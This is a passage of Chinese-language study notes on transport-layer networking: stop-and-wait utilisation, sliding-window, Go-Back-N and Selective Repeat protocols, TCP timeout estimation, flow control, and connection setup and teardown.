<p>最后一种情况称之为<strong>过早超时</strong>，虽然也能够正常工作，但是效率低，一半的分组和确认都是重复的。因此，设置一个合理的等待时间（超时时间）也是很重要的。</p>
<h4 id="rdt-3.0-的性能">4.2.5.2. RDT 3.0 的性能</h4>
<p>RDT 3.0 也是 stop-and-wait
的协议。这种协议可以工作，但是性能很差。如果链路的容量很大，但是一次只能发送一个分组，分组的大小又远小于链路容量，因此利用率就很低。</p>
<p>例：1Gbps的链路，15ms的端-端传播时延，分组的大小为1kB。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603213128.png" /></p>
<p>传输时延：<span class="math inline">\(t_{trans}=\frac
LR=\frac{1kB}{1Gbps}=8us\)</span></p>
<p>RTT：<span class="math inline">\(RTT=2*15ms=30ms\)</span></p>
<p>总时延：<span class="math inline">\(t=RTT + t_{trans} =
30.008ms\)</span></p>
<p>利用率：<span class="math inline">\(p=\frac {传输时延}{总时延}= \frac
{0.008}{30.008} = 0.027\%\)</span></p>
<p>吞吐量：<span class="math inline">\(吞吐量 = 0.027\% * 1Gbps =
270kbps\)</span></p>
<p>发送一个分组的传输时延只有8us，但是发送之后的30ms内都不能够发送分组，只能等待Ack，这样子的利用率太低了，连1%都没有。花着1Gbps的钱，只使用了270kbps的量，太亏了。</p>
<p><strong>瓶颈在于：网络协议限制了物理资源的利用。</strong></p>
<p>因此，可以使用<strong>流水线协议(pipelined)</strong>来提高链路利用率。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603213430.png" /></p>
<p>当 n
增加到一定值的时候，利用率就会到达100%，此时无法再通过增加n来提高利用率。瓶颈就从网络协议转移到了链路带宽。</p>
<h2 id="流水线pipelined协议">4.3. 流水线(pipelined)协议</h2>
<p>流水线：允许发送方在<strong>未得到对方确认</strong>的情况下一次发送多个分组。这就意味着：</p>
<ol type="1">
<li>必须增加序号的范围：使用多个bit表示分组的序号</li>
<li>发送方/接收方要有缓冲区
<ul>
<li>发送方缓冲：已发送、未得到的确认的分组，可能需要重传</li>
<li>接收方缓冲：上层应用取数据的速率 <span
class="math inline">\(\neq\)</span>
本层接收数据的速率；接收到的分组可能乱序，需要进行排序（可靠）</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603215455.png" /></p>
<p>先介绍一个通用的协议：滑动窗口协议</p>
<h3 id="滑动窗口sliede-window协议">4.3.1. 滑动窗口(sliede
window)协议</h3>
<ul>
<li>当sw的尺寸为1时 -&gt; stop-and-wait 协议</li>
<li>当sw的尺寸大于1时 -&gt; pipelined 协议</li>
</ul>
<h4 id="发送缓冲区和发送窗口">4.3.1.1. 发送缓冲区和发送窗口</h4>
<p><strong>发送缓冲区</strong>：</p>
<ul>
<li>形式：内存中的一个区域，落入缓冲区的分开可以发送</li>
<li>功能：用于存放已发送未得到确认的分组，或者可以发送但未发送的分组</li>
<li>必要性：需要重发时可以使用</li>
</ul>
<p>发送缓冲区的大小决定一次最多可以发送多少个未经确认的分组</p>
<p>发送缓冲区中的分组可以分为：</p>
<ul>
<li>未发送的分组：落入发送缓冲区的分组，可以连续发送出去</li>
<li>已发送，未确认的分组：只有得到确认之后，才能将这些分组从发送缓冲区中删除</li>
</ul>
<p><strong>发送窗口</strong>：</p>
<ul>
<li>发送缓冲区中的一个范围
<ul>
<li>那些已发送但未经确认分组的<strong>序号</strong>构成的空间。也有可能包含已确认的序号，但是后沿的第一个分组一定未确认</li>
</ul></li>
<li>发送窗口的最大值 <span class="math inline">\(\leq\)</span>
发送缓冲区的值</li>
<li>一开始：没有发送任何一个分组
<ul>
<li>后沿 = 前沿 （后沿：靠近序号小的边，前沿：靠近序号大的边）</li>
<li>前沿、后沿之间的分组序号的数量就是发送窗口的尺寸，最开始为0</li>
</ul></li>
<li>每发送一个分组，前沿前移一个单位</li>
</ul>
<p>举个例子：</p>
<ol type="1">
<li><p>刚开始的时候，发送缓冲区（绿色）中有0-4这5个分组，此时发送窗口为0</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603220247.png" /></p></li>
<li><p>0，1，2分组发送，但未经确认，此时发送缓冲区不变，发送窗口尺寸为3</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603220515.png" /></p></li>
<li><p>0，1分组得到确认，此时发送缓冲区可以删除0，1，并将5，6加入；发送窗口的后沿移动到2的左边，发送窗口尺寸为1</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603221025.png" /></p></li>
</ol>
<p>发送窗口的移动分为两种：</p>
<ul>
<li><strong>前沿移动</strong>：发送缓冲区中已发送，但未经确认的分组增加时，也就是分组发送的时候。需要注意的是，前沿移动的极限不会超过发送缓冲区。</li>
<li><strong>后沿移动</strong>：发送缓冲区的分组得到确认。需要注意的是，像上面例子中，如果2得到了确认，但是0，1没有得到确认，那么后沿也不会移动！也就是需要发送缓冲区中，序号最小的分组得到了确认，后沿才可以移动。极限不能超过前沿</li>
</ul>
<p>上面的例子中的第3步就是后沿移动，这里再站是一个前沿移动的例子：紧接着上面例子的第3步，3，4，5分组被发送，但还未得到确认，此时前沿移动，结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603221524.png" /></p>
<h4 id="接收缓冲区和接收窗口">4.3.1.2. 接收缓冲区和接收窗口</h4>
<p><strong>接收窗口(Receiving Window, RW) <span
class="math inline">\(=\)</span> 接收缓冲区</strong>。</p>
<blockquote>
<p>上层应用从中取数据，下层往里面灌数据。后面假设一旦接收窗口中的数据可以可靠的向上层提供，就会直接提供，同时接收窗口移动。</p>
</blockquote>
<p>接收窗口的作用：</p>
<ul>
<li>用于控制那些分组可以接收：
<ul>
<li>只有分组的序号落入接收窗口的分组才允许被接收</li>
<li>若序号在接收窗口之外，则丢弃</li>
</ul></li>
<li>接收窗口尺寸为1时，只能是顺序接收。因为序号是有序的，而接收窗口只有一个值，只能够接受完前一个才能接收后一个</li>
<li>接收窗口尺寸大于1时，可以乱序接收。假设接收窗口内的序号为1，2，3，可以接收2，3，1
<ul>
<li>乱序接收，但提交给上层的时候需要按序：1，2，3</li>
</ul></li>
</ul>
<p><strong>接收窗口的滑动和发送确认</strong>：</p>
<ul>
<li>滑动：
<ul>
<li>低序号的分组到来，接收窗口移动</li>
<li>高序号分组乱序到，缓存分组到不交付给上层，接收窗口不滑动</li>
</ul></li>
<li>发送确认：
<ul>
<li>接收窗口尺寸为1：发送连续收到的最大的分组确认（累计确认）。GBN使用</li>
<li>接收窗口尺寸大于1：收到哪个分组，只发送对用分组的确认（非累计确认，or
独立确认）。SR使用</li>
</ul></li>
</ul>
<p>接收窗口就没有发送窗口那样的前沿和后沿的了。接收窗口的尺寸只能是一个固定值，要移动就只能整个窗口移动。</p>
<p>举个例子：</p>
<ol type="1">
<li><p>刚开始的时候，接收窗口如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603222345.png" /></p></li>
<li><p>收到1，2分组，并发送Ack之后的结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603222423.png" /></p></li>
<li><p>当收到0分组的时候，接收窗口移动</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603222527.png" /></p></li>
</ol>
<p>之后，就可以接收3，4，5，6的分组了。</p>
<blockquote>
<p>接收方：红色的表示已收到，绿色的表示接收窗口；发送方：红色的表示发送窗口，绿色表示发送缓冲区</p>
</blockquote>
<p><strong>正常情况下，2个窗口的互动</strong>：</p>
<p>发送窗口：</p>
<ul>
<li>有新的分组落入发送缓冲区范围，发送，前沿移动</li>
<li>来了老的低序号分组的确认，后沿向前移动，新的分组落入发送缓冲区的范围</li>
</ul>
<p>接收窗口：</p>
<ul>
<li>收到分组，落入到接收窗口范围内，接收</li>
<li>是低序号分组，发送确认给对方</li>
</ul>
<p>在滑动窗口协议的基础之上，衍生了两个流水线协议：</p>
<ol type="1">
<li>回退N步协议</li>
<li>选择重传协议</li>
</ol>
<p>两者的最大区别在于接收窗口的尺寸：</p>
<ol type="1">
<li>GBN：接收窗口尺寸为1</li>
<li>SR：接收窗口尺寸大于1</li>
</ol>
<p>两者的共同之处：</p>
<ul>
<li>发送窗口尺寸都大于1</li>
<li>都能一次发送多个未经确认的分组</li>
</ul>
<h3 id="回退n步go-back-n-gbn协议">4.3.2. 回退N步（Go Back N,
GBN）协议</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603224648.png" /></p>
<ol type="1">
<li>上图中（发送缓冲区为4，接收窗口尺寸为1）可以看到，发送方发送了0，1，2，3，4四个分组，其中0，1被接收，2丢失，3到达了接收方。</li>
<li>0，1按顺序到达接收方，因此接收窗口移动，但是2丢失了，3到达接收方由于超出了接收窗口的范围，因此接收方回复一个Ack1，表示“我只接收到了0，1”。</li>
<li>发送方收到了来自0，1分组的确认，发送窗口后沿前移，发送缓冲区将0，1，删除，将4，5加入，并且发送4，5分组。</li>
<li>接收方收到4，5分组，但由于还是在接收窗口范围之外，所以回复的还是Ack1。</li>
<li>发送方在超时时间过后或者收到接收方的Ack1之后，会选择将2，3，4，5分组都重传。</li>
<li>最后，接收方按顺序接收了2，3，4分组。</li>
</ol>
<p>从上面可以看到，即使接收方接收到了3，4，5，但因为2没收到，所以发送的是Ack1，由于是累计确认，表达的意思就是“1以及之前的分组我都收到了，后面的分组我都没收到”。发送方接收到Ack1就会将2，3，4，5重传。</p>
<h3 id="选择重传selective-repeat-sr协议">4.3.3. 选择重传(Selective
Repeat, SR)协议</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603225555.png" /></p>
<ol type="1">
<li>上图中，发送方发送了0，接收方收到，接收窗口移动，发送Ack0</li>
<li>发送方发送1，接收方收到，接收窗口移动，发送Ack1</li>
<li>发送方发送2，分组丢失</li>
<li>发送方发送3，此时发送窗口满。接收方收到，接收窗口不移动，因为还没收到2。发送Ack3</li>
<li>发送方收到Ack0，发送窗口后沿移动，发送缓冲区删除0，添加4，并发送4。接收方收到4，接收窗口不移动，回复Ack4</li>
<li>发送方收到Ack1，发送窗口后沿移动，发送缓冲区删除1，添加5，并发送5。接收方收到4，接收窗口不移动，回复Ack5</li>
<li>分组2超时时间过，发送方重传，接收方收到，接收窗口移动，变为6，7，8，9。回复Ack2</li>
</ol>
<p>SR是非累计确认，只要分组序号在接收窗口内就会保存分组，并且会一个Ack，这个Ack仅仅代表“我收到了这个分组”，不能够表示收到这个分组序号之前的所有分组。发送方只对那些没有收到Ack的分组进行重发-<strong>选择性重发</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220603230219.png" /></p>
<h3 id="总结">4.3.4. 总结</h3>
<p><strong>GBN</strong>：</p>
<ul>
<li>发送端最多再、在流水线中有N个未确认的分组</li>
<li>接收端只是发送累积确认</li>
<li><strong>发送端拥有对最老的（最早发送的）未确认分组的定时器（超时定时器）</strong>
<ul>
<li>只需设置一个定时器</li>
<li>当定时器到时，重传所有未确认分组</li>
<li>当收到Ack，且此时还有已发送、未确认的分组，定时器重启</li>
<li>当收到Ack，此时没有已发送、未确认的分组，定时器关闭</li>
</ul></li>
</ul>
<p><strong>SR</strong>：</p>
<ul>
<li>发送端最多再、在流水线中有N个未确认的分组</li>
<li>接收方对每个到了的分组单独确认</li>
<li>发送方为每个未确认的分组保持一个定时器（超时定时器）
<ul>
<li>当定时器到时，只是重发到时的未确认分组</li>
<li>当分组的单确认，关闭对应分组的定时器</li>
</ul></li>
</ul>
<p><strong>到此为止，可靠数据传输拥有以下机制</strong>：</p>
<ol type="1">
<li>校验和</li>
<li>定时器</li>
<li>序号</li>
<li>Ack</li>
<li>窗口</li>
<li>流水线</li>
<li>重传</li>
</ol>
<h1 id="面向连接的传输tcp">5. 面向连接的传输：TCP</h1>
<h2 id="概述">5.1. 概述</h2>
<ul>
<li><p>点对点：一个发送方，一个接收方</p></li>
<li><p>可靠的、按顺序的字节流：没有报文边界</p></li>
<li><p>管道化（流水线）：TCP拥塞控制和流量控制设置窗口大小</p></li>
<li><p>发送和接收缓存</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604084048.png" /></p></li>
<li><p>全双工数据</p>
<ul>
<li>在同一连接中数据流双向流动</li>
<li>MSS：MAximum Segment Size，最大报文段长度</li>
</ul></li>
<li><p>面向连接：在数据交换之前，通过握手初始化双方的状态变量</p></li>
<li><p>有流量控制：发送方不会淹没接收方</p></li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604084108.png" /></p>
<p>上图中，除了 “应用层数据(或者叫body)”
之外，其他的都是头部。这里主要解释两个字段：序号和确认号。R, S,
F是TCP连接建立、拆除时使用的</p>
<ul>
<li>序号：报文段的body部分的首字节在自己流中的偏移量</li>
<li>确认号：期望从另一发收到的下一个字节的偏移量；确认确认好之前的所有字节已成功接收（不包括确认号本身）</li>
<li>首部长度：主要用来指名该报文段中的首部的长度，用以区分首部和body</li>
</ul>
<p>解释一下（TCP为例），数据链路层帧的body部分最大长度为1500B，称为最大传输单元(Maximum
transmission Unit,
MTU)。也就是网络层的body部分加上IP头部（20字节）最大只能是1500字节。从而网络层的body最大为1480。同样的，网络层的body就是传输层的body加上TCP头部（一般为20字节，可能有可选项），因此，TCP报文段的最大长度就是1460字节，这个也称为<strong>最大报文段长度(Maximum
Segment Size, MSS)</strong>。</p>
<p>应用层向下层传递的是字节流，假设传递了一个7300B的字节流，那么这个字节流会被划分为5段，每段的长度正好是MSS，需要为每一个MSS加上TCP首部字段。假设字节流的第一个字节的序号为x，那么第一个TCP报文段中的序号就是x，第二个TCP报文段中的序号就是x+MSS，依此类推。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604085250.png" /></p>
<p>当接收方收到第一个TCP报文段之后回复的确认号是 x+MSS，说明 x+MSS-1
及之前的都收到了，接下来请发送 x+MSS 开始的字节。（类似于累计确认）</p>
<blockquote>
<p><strong>TCP建立连接的时候会商量好对方的第一个字节的序号</strong>。所以，TCP字节流的第一个字节的序号一般不为0。这么做的好处就是古老的TCP报文段不会对现有的TCP报文产生影响。如果从0开始，很久之前的序号为0的报文段因为网络原因到达对方，但是现在的序号为0的报文段还没到达，如果新旧的进程连接使用的是同一端口，那么可能就会产生误会。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604091000.png" /></p>
<p>（TCP连接协商：A的第一个字节序号为42，B的第一个字节序号为79）</p>
<p>这里还需要说明一点，TCP中的接收窗口一般大于1，按照[[#4 3 1 2
接收缓冲区和接收窗口]]中的说法，此时应该采用非累计确认。但是，TCP采用了累计确认，那么就会出现一个问题</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604090706.png" /></p>
<p>上图中，每种颜色的字节为一个TCP报文段，如果此时接收到了蓝色的TCP报文段，应该怎么做？因为黄色的TCP报文段还没有收到，TCP无法回复Ack，这时有两种做法：</p>
<ol type="1">
<li>缓存蓝色TCP报文段，发送黄色第一个字节的Ack</li>
<li>直接丢弃蓝色TCP报文段</li>
</ol>
<p>这两种使用哪一种，协议没有明确指定，由厂家决定生产的产品要使用哪一种。</p>
<h2 id="tcp的rtt和超时">5.2. TCP的RTT和超时</h2>
<p>之前也说过，设置一个合理的超时时间是非常重要的。</p>
<ul>
<li>比RTT长，但是RTT一般是变化的</li>
<li>不能太短，否则会太早超时，发送一些不必要的重传</li>
<li>不能太长，否则报文丢失的时候，反应太慢，太消极</li>
</ul>
<p>因此，这里介绍一个种办法：</p>
<ol type="1">
<li>估计RTT
<ol type="1">
<li>sanmpleRTT：测量从报文段发出到收到确认的时间，如果有重传，则忽略此次测量</li>
<li>sampleRTT会变化，因此，对几个最近的测量值加权平均，得到的值作为RTT</li>
</ol></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604092407.png" /></p>
<p>公式：</p>
<p><span class="math display">\[
estimatedRTT=(1-\alpha)*estimatedRTT + \alpha * sampleRTT
\]</span> 右边的 estimatedRTT
表示的是之前的RTT，左边的RTT表示的是当前的RTT。这是一个迭代的公式，将其展开就是：</p>
<p><span class="math display">\[
estimatedRTT = \alpha * sampleRTT_{Now} +
(1-\alpha)*sampleRTT_{pre1}+(1-\alpha)^2*sampleRTT_{pre2}+...+(1-\alpha)^n*sampleRTT_{pre
n}
\]</span></p>
<ol start="2" type="1">
<li>安全边界</li>
</ol>
<p>这一次的sampleRTT可能会与上一次的estimatedRTT相差很大，也可能相差很小。如果相差很大的话，说明estimatedRTT变化很大，此时方差很大，所以需要设置较大的安全边界时间，公式如下</p>
<p><span class="math display">\[
DevRTT=(1-\beta)*DevRTT+\beta * |sampleRTT-estimatedRTT|
\]</span></p>
<p>这也是一个迭代的式子。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604093442.png" /></p>
<ol start="3" type="1">
<li>设置超时时间。公式：</li>
</ol>
<p><span class="math display">\[
TimeoutInterval = estimatedRTT + 4 * DevRTT
\]</span></p>
<h2 id="可靠数据传输">5.3. 可靠数据传输</h2>
<p>TCP在IP不可靠服务的基础上，建立了RDT：</p>
<ul>
<li>管道化的报文段</li>
<li>累计确认（像GBN）</li>
<li>单个重传定时器（像GBN）</li>
<li>是否可以接收乱序TCP报文段，协议没有规定</li>
</ul>
<p><strong>TCP重传</strong>：</p>
<ol type="1">
<li>超时重传：只重传最早的未确认的TCP报文段（像SR）</li>
<li>快速重传：如果发送方连续收到多个同一个确认号的Ack，则重传该序号的TCP报文段</li>
</ol>
<ul>
<li>Ack丢失的情况：</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604100105.png" /></p>
<ul>
<li>过早超时的情况：</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604100201.png" /></p>
<p>虽然Ack超时了，但是接收方还是接收了92-99和110-119的字节，所以接收方再次收到
92-99 的TCP报文段的时候，发送的Ack还是120。</p>
<ul>
<li>累计确认：</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604100401.png" /></p>
<p>这种情况和上一种情况类似，这里是Ack丢失，本质上也是发送方没有即使接收到Ack。</p>
<h3 id="产生tcp-ack的建议">5.3.1. 产生TCP ACK的建议</h3>
<p>这里介绍一下接收方在不同情况下会如何发送ACK。</p>
<ol type="1">
<li>期望的报文段按序到达，所有在期望的报文段之前的数据都已被确认</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101748.png" /></p>
<p>黄色之前的都已经到达了，此时黄色的也到达。那么<strong>接收方不会直接发Ack</strong>，它会启动一个辅助定时器（500ms）。如果下一个报文段（蓝色）在这个时间段内没有到达，那么就会发送<strong>关于黄色的Ack</strong>。然后接收窗口移动</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101811.png" /></p>
<p>（红+绿为棕）</p>
<ol start="2" type="1">
<li>在上一种情况下，蓝色的报文段在规定时间内到达</li>
</ol>
<p>接收方接收蓝色报文段，并回复一个累计的Ack，确认两个报文段都到达了。接收窗口移动</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101847.png" /></p>
<ol start="3" type="1">
<li>比期望序号大的报文段乱序到达。</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101314.png" /></p>
<p>期望黄色的，但是此时到来了棕色的，那么接收方会立即发送一个<strong>期待黄色报文段的Ack</strong>，指名下一个期待的报文段是黄色。至于棕色是缓存还是丢弃，由厂家决定。接收窗口不移动</p>
<ol start="4" type="1">
<li>能部分或完全填充接收数据间隔的报文段到达。
<ul>
<li>部分填充</li>
<li>完全填充</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101512.png" /></p>
<p>假设黑色和棕色已经接收，此时到来了黄色，那么接收方会发送<strong>期待蓝色的Ack</strong>。同时，接收窗口移动</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604101926.png" /></p>
<p>这种情况就是部分填充。</p>
<p>假设黑色和棕色已经接收，此时黄色和蓝色都来了，那么接收方就会发送<strong>期待白色的Ack</strong>。同时，接收窗口移动</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604102016.png" /></p>
<p>这种情况称为完全填充。</p>
<h3 id="快速重传">5.3.2. 快速重传</h3>
<p>因为超时时间的设置比较保守，因此超时周期往往比较长。因此，可以使用重复的Ack来检测报文段的丢失，从而实现快速重传</p>
<ul>
<li>发送方通常连续发送大量的报文段</li>
<li>如果中间某个报文段丢失，通常会引起多个重复的Ack（上面[[#产生TCP
ACK的建议]]的第3种情况）</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604102304.png" /></p>
<p>像上图一样，发送方收到50-59这个同一数据的3个冗余的Ack（后面三个Ack），那么即使超时时间还没到，也会启动重传，此时重传的就是50-59，也就是<strong>最小的、未确认的序号的段</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604102437.png" /></p>
<h2 id="流量控制">5.4. 流量控制</h2>
<p>首先需要明确一定，TCP连接的两端，并不是一个是发送方，另一个是接收方，而是两端都是既为发送方也为接收方。</p>
<p>刚刚上面的描述中都只讨论了单向的数据传输，接收方只需要回Ack就可以了。实际并不是这样的。实际可能是，A发送一个TCP报文段，这个报文段内即存在要发送给B的数据，也存在着对B上一次发送的数据的确认。B收到A的TCP报文段后，如果自己还有数据没发，那么就会发送给A一个TCP报文段，里面包含了对此次A的报文段的确认，也包含了自己要发的数据。</p>
<p>如果B没有数据要发，那么TCP报文段内的body部分需要填充（帧也有一个最小的长度）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604104220.png" /></p>
<blockquote>
<p>ack=0 表示之前并未接收到对方的报文段。我个人理解，书本没有提到</p>
</blockquote>
<p><strong>流量控制的目标</strong>：接收方控制发送方，不要发送的太快、太多，否则接收方的缓冲区会溢出。</p>
<p><strong>操作</strong>：</p>
<ul>
<li>接收方会在发送给发送方的TCP报文段头部的rwnd字段表明空闲的buffer的大小。</li>
<li>发送方限制未确认字节的个数 <span class="math inline">\(\leq\)</span>
接收方的rwnd值。如果大于，即使发送了也会被丢弃。</li>
<li>保证接收方不会被淹没</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604105127.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604105041.png" /></p>
<blockquote>
<p>这里的RcvBuffer和之前提到的接收缓冲区是不一样的。接收缓冲区 =
接收窗口 = <span class="math inline">\(RcvBuffer - (lastByteRcvd -
LastByteRead)\)</span></p>
</blockquote>
<h2 id="连接管理">5.5. 连接管理</h2>
<p>主要介绍：</p>
<ul>
<li>连接建立</li>
<li>连接拆除</li>
</ul>
<h3 id="连接建立">5.5.1. 连接建立</h3>
<p><strong>连接建立的本质</strong>：</p>
<ul>
<li>双方知道与对方通信</li>
<li>一些资源要准备好。比如说发送/接收缓冲区</li>
<li>一些控制变量要设置好。比如说序号</li>
</ul>
<h4 id="二次握手">5.5.1.1. 二次握手</h4>
<p>比较容易让人想到的建立过程就是，客户端发请求，服务器同意。那么TCP连接就建立起来了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604111045.png" /></p>
<p>理想情况下是可行的，但是实际情况太复杂了。2次握手会有两个比较大的问题：</p>
<ol type="1">
<li>半连接</li>
<li>老的数据被当成新的数据接受了</li>
</ol>
<p>首先半连接：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604112929.png" /></p>
<p>客户发送的请求，服务器接收到了，服务器认为连接建立。但是回复的resp由于网络原因超时了，客户会再次发送req，过了一会，第一个req的resp到达，客户也认为连接建立。进行数据传输之后，连接断开，这时候之前重传的req到达，服务器认为客户再次请求连接，于是再次回复resp，但是客户端不理解这个resp的意思，因此客户端不建立此次连接。最终服务端维持了一个<strong>半连接</strong>，就是自己单方面认为的连接。</p>
<p><strong>连接需要使用资源的，半连接就相当于占了资源不干事。</strong></p>
<p>然后是第二个问题：老的数据被当成新的数据接受了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604112902.png" /></p>
<p>第一次连接resp超时到达，所以重传了req。但是第一次连接双方还是建立起来了。愉快的传数据，（第一个数据重传了一次）然后连接断开。这个时候，重传的req到达，服务器再次建立连接（半连接），并且之前重传的数据也正好到了（并且还是正好的第一个数据），那么服务器会将该数据接收。</p>
<p>其实这里，除了半连接之外，服务器还接收了之前的数据，这是没有意义的。也白白占用了资源。</p>
<p>解决这两个问题的办法就是3次连接</p>
<h4 id="三次握手">5.5.1.2. 三次握手</h4>
<p>三次握手本质上是：</p>
<ol type="1">
<li>A：我的条件是这样</li>
<li>B：我同意</li>
<li>B：我的条件是这样</li>
<li>A：我也同意</li>
</ol>
<p>之后两者建立连接。但是刚刚也介绍过了，Ack可以和数据放到同一个TCP报文段中，因此简化为：</p>
<ol type="1">
<li>A：我的条件是这样</li>
<li>B：我同意。我的条件是这样</li>
<li>A：我也同意</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604112735.png" /></p>
<p>（第三次握手可以带上数据）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604113833.png" /></p>
<p>上图是半连接的情况，此时即使服务器收到重传的请求，并且接受了，回一个响应。客户不理解这个响应就拒绝了。连接建立不起来。服务器过了一段时间后没收到第三次握手，回到listen状态。</p>
<p>至于接收老数据，这个问题其实是建立在半连接之上的，而三次握手解决了半连接，因此自然而然的也解决了这个问题。</p>
<p>至于为什么不能使用固定的序号，比如从0开始。举个例子，假设序号从0开始，建立连接的过程就开始</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604114804.png" /></p>
<p>第一次TCP中，有一个数据重传了，在第2次TCP中，到达了，此时就会被服务器给错误的接收。虽然这几率不算很大，但也绝对不小（计算机中数据量太大了）。此时的概率为“前面的TCP连接数据i重传，正好在当前的TCP连接的数据i时到达”，为了降低概率，采用了随机的序号，在TCP建立的时候要协商好。</p>
<p>虽然，第一次TCP协商的和第二次协商的有可能一样，这个概率不算大，也不算小，但是这个概率只是前后TCP连接序号的起始是一样的概率，还要乘以“前面的TCP连接数据i重传，正好在当前的TCP连接的数据i时到达”的概率。两者相乘的概率就很小了，但不代表没有。</p>
<h3 id="连接拆除">5.5.2. 连接拆除</h3>
<p>TCP连接的拆除可以认为是拆除两个<strong>半连接</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604120508.png" /></p>
<p><strong>客户端</strong>：发送Fin，服务器收到之后，回一个Ack。此时客户端就不能往服务器发送数据。客户端这一侧的<strong>半连接</strong>被关闭</p>
<p><strong>服务器</strong>：也是一样的，服务器发送Fin，客户端收到之后，回一个Ack。此时服务器就不能往客户端发送数据，服务器这一侧的<strong>半连接</strong>被关闭。</p>
<p>特点是：</p>
<ul>
<li>对称释放</li>
<li>并不完美</li>
</ul>
<p>如何理解并不完美呢？这里介绍一个经典的问题“两军问题”，如下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220604120704.png" /></p>
<p>此时，山谷两边的红军单挑是打不过白军的，但是如果两边的红军一起进攻，是可以打败蓝军。现在问题是，左边的红军如何与右边的红军协商好一个时间一起进攻呢？</p>
<p>左边派出一个人，从谷底绕过去，到达右边，然后告诉对方，明天8点进攻(Fin)。且不说这个人能不能到达，假设能够到达，左边的红军明天8点敢进攻吗？答案是不敢，因为不知道右边到底收没收到。</p>
<p>因此，右边收到消息之后需要也派一个人到达左边，告诉左边的红军，可以(Ack)。我们也不讨论这个人能否到达，假设这个人能到达。左边的红军这回敢进攻了，但是右边敢吗？他不敢呀，因为他不知道左边的红军能不能收到消息。</p>
<p>那么左边又要再派出一个人，然后右边收到后再派出一个人，没完没了了。这就是“两军问题”。在TCP连接拆除时也存在该问题。</p>
<p><strong>问题的关键在于</strong>：<strong>我给你的ack是不可靠的，需要你给我的ack回复一个ack，同样的道理。你给我的ack也不可靠，我也需要再给你的ack回复一个ack。</strong></p>
<p>TCP连接建立中也没有好的办法解决这个问题。因此，client发送完Fin，并接受Ack后就会关闭自己这一侧的连接，但是服务器并不知道client是否关闭了，因此还可以往client发送数据，所以client要设置成这个时候可以接收数据，但是不能发送数据（除了Ack）。</p>
<p>服务器发送完Fin，接收到Ack后，关闭自己这一侧的连接，此时服务器也是不能发送数据（除了Ack），只能接收数据。</p>
<p>双方其实都不知道对方是否关闭了连接，只能够知道自己关闭了连接。那么客户端在接收到服务器的Fin之后，回一个Ack，并且不知道Ack是否能够到达，因此会等待一段时间，如果这段时间内没有再收到数据或者Fin，就会关闭连接。</p>
<p>服务器因为可以接收到Ack所以接收到之后就会关闭连接。</p>
<h1 id="拥塞控制原理">6. 拥塞控制原理</h1>
